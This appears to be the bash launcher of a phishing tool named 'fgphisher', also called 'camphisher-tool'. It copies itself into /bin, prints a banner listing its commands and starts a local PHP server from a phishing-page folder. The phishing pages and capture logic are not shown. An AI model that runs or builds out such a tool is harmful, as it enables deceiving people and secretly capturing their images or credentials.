#!/bin/bash
cp -r fgphisher /bin/

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"  
RESETBG="$(printf '\e[0m\n')" ##LEAN="$(printf '\e[0m\e[1;77m\n')"


printf " \e[1;37m\n"

banner(){
cat << EOF
 _____           _     _     _               
|  ___|_ _ _ __ | |__ (_)___| |__   ___ _ __ 
| |_ / _' | '_ \| '_ \| / __| '_ \ / _ \ '__|
|  _| (_| | |_) | | | | \__ \ | | |  __/ |   
|_|  \__, | .__/|_| |_|_|___/_| |_|\___|_|   
     |___/|_|                                
${WHITE}Welcome to camphisher-tool                                   
${WHITE}Version 0.3.1                                                                 
${WHITE}Commands camphisher-tool (${BLACK}fgphisher -f --help${WHITE})                    

${BLACK}┌──[${WHITE}COMMANDS${BLACK}]
${BLACK}└─${WHITE} fgphisher -s --start  || fgphisher -d files.png
EOF
}

start(){
cd server.phisher && php -S 127.0.1:8080
}

banner
